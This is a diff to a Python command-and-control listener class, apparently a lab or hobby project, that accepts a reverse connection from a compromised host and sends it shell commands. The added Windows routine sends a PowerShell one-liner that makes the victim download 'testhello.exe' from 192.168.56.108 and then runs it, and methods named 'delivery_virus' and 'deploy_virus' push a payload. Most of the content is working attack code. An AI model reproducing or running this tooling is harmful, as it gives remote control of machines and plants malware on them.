@@ -4,7 +4,7 @@ import os, time
 
 class tunnel:
     
-    def __init__(self, lhost="0.0.0.0", lport=4444):
+    def __init__(self, lhost="0.0.0.0", lport=1337):
         self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.sock.bind((lhost,lport))
         self.sock.listen(5)
@@ -17,17 +17,13 @@ class tunnel:
         return self.conn
     
     def sent_command(self, command):
+        print(command)
         self.conn.send(command)
         time.sleep(1)
         
     def get_response(self):
-        data = b''
-        while True:
-            chunk = self.conn.recv(1024)
-            if not chunk:
-                break
-            data += chunk
-        return data
+        response = self.conn.recv(1024).decode()
+        return response
     
     def delivery_virus(self, virus):
         self.conn.sendall(virus)
@@ -57,9 +53,7 @@ class tunnel:
         else:
             return ""
         
-   
-        
-    def deploy_virus(self, data):
+    def deploy_virus(self, data, ostype="windows"):
         serversocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         host = "0.0.0.0"
         port = 8081
@@ -67,8 +61,12 @@ class tunnel:
         serversocket.listen(5)
         print("Deployment Server listening on port", port)
         
-        ask_to_download = 'powershel -c ($client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.56.108", 8080); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $receivedBytes = 0; $totalBytes = 0; $file = New-Object System.IO.FileStream("testhello.exe", [System.IO.FileMode]::Create); do { $receivedBytes = $stream.Read($buffer, 0, 1024); $totalBytes += $receivedBytes; $file.Write($buffer, 0, $receivedBytes); } while ($receivedBytes -ne 0); $file.Close(); $client.Close();)'
-        self.sent_command(ask_to_download.encode())
+        if ostype=="windows":
+            self.depoly_to_windows()
+        else:
+            self.deploy_to_linux()
+        
+
         clientsocket,addr = serversocket.accept()
         print("Got a connection from", addr)
         try:
@@ -83,8 +81,63 @@ class tunnel:
         clientsocket.close()
         serversocket.close()
             
+    def depoly_to_windows(self):
+        #start command sequence
+        try:
+            start = input("press enter to start")
+            command = "cd \\users".encode()
+            command+=b"\n"
+            c.sent_command(command)
+            print("change to users directory")
+            print(c.get_response())
+            command = "powershell".encode()
+            command+=b"\n"
+            c.sent_command(command)
+            print("run powershell")
+            print(c.get_response())
+            command = '$client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.56.108", 8081); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $receivedBytes = 0; $totalBytes = 0; $file = New-Object System.IO.FileStream("testhello.exe", [System.IO.FileMode]::Create); do { $receivedBytes = $stream.Read($buffer, 0, 1024); $totalBytes += $receivedBytes; $file.Write($buffer, 0, $receivedBytes); } while ($receivedBytes -ne 0); $file.Close(); $client.Close();'.encode()
+            command+=b"\n"
+            c.sent_command(command)
+            print("target machine is starting to connect to the us")
+            print(c.get_response())
+            time.sleep(3)
+            command = "./testhello.exe".encode()
+            command+=b"\n"
+            c.sent_command(command)
+            print(c.get_response())
+        except TimeoutError as t:
+            print("no Response")
+            
+    def deploy_to_linux():
+        #start command sequence
+        # try:
+        #     start = input("press enter to start")
+        #     command = "cd \\users".encode()
+        #     command+=b"\n"
+        #     c.sent_command(command)
+        #     print("change to users directory")
+        #     print(c.get_response())
+        #     command = "powershell".encode()
+        #     command+=b"\n"
+        #     c.sent_command(command)
+        #     print("run powershell")
+        #     print(c.get_response())
+        #     command = '$client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.56.108", 8081); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $receivedBytes = 0; $totalBytes = 0; $file = New-Object System.IO.FileStream("testhello.exe", [System.IO.FileMode]::Create); do { $receivedBytes = $stream.Read($buffer, 0, 1024); $totalBytes += $receivedBytes; $file.Write($buffer, 0, $receivedBytes); } while ($receivedBytes -ne 0); $file.Close(); $client.Close();'.encode()
+        #     command+=b"\n"
+        #     c.sent_command(command)
+        #     print("target machine is starting to connect to the us")
+        #     print(c.get_response())
+        #     time.sleep(3)
+        #     command = "./testhello.exe".encode()
+        #     command+=b"\n"
+        #     c.sent_command(command)
+        #     print(c.get_response())
+        # except TimeoutError as t:
+        #     print("no Response")
+        pass
+        
 
-# c = tunnel()
+c = tunnel()
 
 # while True:
 #     try:
